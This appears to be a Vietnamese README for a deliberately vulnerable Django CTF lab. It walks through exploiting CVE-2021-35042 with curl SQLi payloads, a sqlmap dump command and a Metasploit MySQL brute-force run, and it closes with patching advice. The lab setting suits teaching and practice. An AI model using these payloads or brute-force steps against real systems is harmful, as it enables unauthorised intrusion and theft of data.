# CTF Blog Django — Pentest Lab

**Môi trường thực hành tấn công SQLi + Metasploit MySQL**

> Tất cả lỗ hổng trong project này được tạo ra **cố ý** phục vụ mục đích học tập và demo CTF.
> Không áp dụng kỹ thuật này lên hệ thống thực nếu không được phép.

---

## Giới thiệu

Project là một blog giả lập theo phong cách Cyberpunk, chạy Django 3.2.4 + MySQL 8.0 trong Docker Compose. Mục đích chính:

- Demo lỗ hổng **CVE-2021-35042** — SQL Injection qua `QuerySet.order_by()` trong Django < 3.2.5
- Thực hành khai thác bằng **sqlmap** (automated) và **exploit_dump.py** (manual)
- Thực hành **Metasploit** để brute force MySQL và enumerate database
- Tìm **FLAG** được giấu trong bản ghi private của database

**FLAG mục tiêu:** `HTB{Dj4ng0_CVE_2021_35042}` (trong bảng `blog_post`, bản ghi `status=private`)

---

## Kiến trúc hệ thống

```
┌─────────────────────────────────────────┐
│           Docker Compose                │
│                                         │
│  ┌──────────────┐   ┌────────────────┐  │
│  │  web:8000    │──►│  db (MySQL)    │  │
│  │  Django 3.2.4│   │  Port 3306     │  │
│  └──────────────┘   │  Port 3307     │  │
│                      └────────────────┘  │
└─────────────────────────────────────────┘
         │                    │
    Trình duyệt          Metasploit /
    sqlmap               MySQL client
```

| Thành phần | Giá trị |
|---|---|
| Web app | `http://localhost:8000` |
| MySQL (default port) | `localhost:3306` |
| MySQL (alternate port) | `localhost:3307` |
| Database | `ctf_blog` |

---

## Cài đặt và chạy

### Yêu cầu
- Docker Desktop (Windows/Linux/macOS)
- Docker Compose v2+

### Khởi động

```bash
# Clone project
git clone https://github.com/thohaisaotroi/ctf-blog-django
cd ctf-blog-django

# Build và chạy toàn bộ stack
docker-compose up --build

# Kiểm tra trạng thái (web + db phải là healthy)
docker-compose ps
```

Sau khi khởi động, truy cập `http://localhost:8000`. Web app tự động seed dữ liệu.

### Tài khoản mặc định

| Vai trò | Username | Password | Ghi chú |
|---|---|---|---|
| Admin | `admin` | `admin123` | Truy cập `/admin-dashboard/` |
| User | `n30_user` | `12345` | Tài khoản thường |
| User | `ghost` | `54321` | Tài khoản thường |
| MySQL | `ctf_user` | `ctf_pass` | Tài khoản DB của app |
| MySQL | `root` | `rootpassword` | Root MySQL |

> **Lưu ý:** `pentestuser/weak123` được thêm qua `init.sql` để demo Metasploit brute force.
> File `init.sql` bị gitignore và không xuất hiện trên GitHub.

---

## Các lỗ hổng được tạo cố ý

### 1. SQL Injection — CVE-2021-35042

**Vị trí:** `blog/views.py` → hàm `posts_list()`, dòng 804  
**Endpoint:** `GET /posts/?sort=<payload>`

Django 3.2.4 truyền trực tiếp giá trị `sort` từ query string vào `QuerySet.order_by()` mà không sanitize. Khi ORM gặp dấu `.` trong tên field (vd: `blog_post.id`), nó chuyển sang nhánh `RawSQL` — không có whitelist, không có escape.

```
GET /posts/?sort=blog_post.id+(SELECT+extractvalue(1,concat(0x7e,database(),0x7e)))
→ Error-based SQLi lộ tên database trong response HTML
```

**Kỹ thuật khai thác:** Error-based (extractvalue / GTID_SUBSET)

### 2. Weak MySQL Credentials (demo brute force)

`pentestuser:weak123` — password nằm trong top 100 wordlist phổ biến, dễ bị Metasploit brute force bằng `rockyou.txt`.

### 3. Thông tin nhạy cảm trong database

- MD5 hash của password user lưu trong `blog_user` — dễ crack bằng hashcat/CrackStation
- FLAG plaintext trong cột `secret_flag` của bản ghi private

---

## Attack Chain: SQLi → Metasploit

```
[GIAI ĐOẠN 1] Phát hiện SQLi
      │
      ▼
GET /posts/?sort=blog_post.id+1
→ Trang trả về bình thường (sort hợp lệ)
      │
      ▼
GET /posts/?sort=blog_post.id+(SELECT extractvalue(...))
→ MySQL error xuất hiện trong HTML
      │
[GIAI ĐOẠN 2] Khai thác bằng sqlmap/exploit_dump.py
      │
      ▼
Dump bảng blog_post → tìm secret_flag = HTB{...}
Dump bảng blog_user → lấy MD5 hash của admin
      │
[GIAI ĐOẠN 3] Pivot sang Metasploit
      │
      ▼
Brute force MySQL port 3306 bằng mysql_login module
→ Tìm pentestuser:weak123
      │
      ▼
mysql_enum → liệt kê users, privileges, databases
mysql_sql  → chạy truy vấn tùy ý trực tiếp
```

---

## Hướng dẫn tấn công từng bước

### Bước 1: Xác nhận SQLi thủ công

Mở trình duyệt hoặc curl:

```bash
# Sort hợp lệ — trang bình thường
curl "http://localhost:8000/posts/?sort=created_at"

# Inject SLEEP — nếu trang chậm ~3s thì SQLi tồn tại
curl "http://localhost:8000/posts/?sort=blog_post.id,(SELECT+SLEEP(3))"

# Error-based — lộ version MySQL ngay trong HTML
curl "http://localhost:8000/posts/?sort=blog_post.id+(SELECT+extractvalue(1,concat(0x7e,version(),0x7e)))"
```

### Bước 2: Dùng sqlmap tự động

```bash
# Xem hướng dẫn đầy đủ trong sqlmap_guide.sh
bash sqlmap_guide.sh

# Lệnh cốt lõi — dump FLAG
sqlmap -u "http://localhost:8000/posts/?sort=blog_post.id%2B1" \
  -p sort \
  --prefix="blog_post.id+" \
  --technique=E \
  --dbms=mysql \
  --no-cast \
  --batch \
  -D ctf_blog -T blog_post \
  -C secret_flag,status \
  --dump
```

### Bước 3: Dùng exploit_dump.py (manual exploit)

```bash
# Chạy Python dumper tự viết
python exploit_dump.py
```

Script sẽ dump toàn bộ database qua SQLi, ưu tiên các bảng `blog_bloguser`, `blog_post`.

### Bước 4: Brute force MySQL bằng Metasploit

```bash
# Xem hướng dẫn đầy đủ trong metasploit_guide.sh
bash metasploit_guide.sh

# Hoặc chạy Metasploit trực tiếp
msfconsole -q -x "
use auxiliary/scanner/mysql/mysql_login;
set RHOSTS 127.0.0.1;
set RPORT 3306;
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt;
set PASS_FILE /usr/share/wordlists/rockyou.txt;
run
"
```

---

## Phòng thủ và vá lỗi

### Vá CVE-2021-35042

**Cách 1 — Nâng cấp Django (khuyến nghị):**
```bash
pip install "django>=3.2.5"
```

**Cách 2 — Whitelist sort parameter:**
```python
# Thay thế code hiện tại trong views.py
ALLOWED_SORT_FIELDS = {'created_at', '-created_at', 'views', '-views', 'title', '-title'}

def posts_list(request):
    sort_param = request.GET.get('sort', 'created_at')
    if sort_param not in ALLOWED_SORT_FIELDS:
        sort_param = 'created_at'          # reject unknown values
    posts = list(qs.order_by(sort_param))  # now safe
```

### Vá Weak Credentials

- Đổi tất cả password sang chuỗi ngẫu nhiên 20+ ký tự
- Không để MySQL port 3306 expose ra internet
- Dùng `IDENTIFIED WITH caching_sha2_password` thay MD5

### Nguyên tắc chung

| Lỗ hổng | Biện pháp |
|---|---|
| SQLi qua ORM | Luôn validate input trước khi truyền vào `order_by()` / `filter()` |
| Weak password | Password policy + bcrypt/argon2 (không dùng MD5) |
| Port exposed | Firewall rule, không bind 0.0.0.0 trên production |
| Sensitive data in DB | Encrypt at rest, column-level encryption cho cột nhạy cảm |

---

## Cấu trúc project

```
ctf-blog-django/
├── blog/
│   ├── management/commands/seed_data.py   # Tạo dữ liệu mẫu
│   ├── models.py                          # ORM models
│   ├── views.py                           # [CVE-2021-35042 tại posts_list()]
│   └── urls.py
├── ctf_blog/
│   └── settings.py
├── templates/                             # HTML templates
├── static/                                # CSS/JS
├── exploit_dump.py                        # Manual SQLi dumper
├── sqlmap_guide.sh                        # Hướng dẫn sqlmap từng bước
├── metasploit_guide.sh                    # Hướng dẫn Metasploit từng bước
├── VULNERABILITY_ANALYSIS.md             # Phân tích lỗ hổng chi tiết
├── docker-compose.yml                     # Stack config
├── Dockerfile
└── requirements.txt
```

---

## Tham khảo

- [CVE-2021-35042 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-35042)
- [Django Security Release 3.2.5](https://www.djangoproject.com/weblog/2021/jul/01/security-releases/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
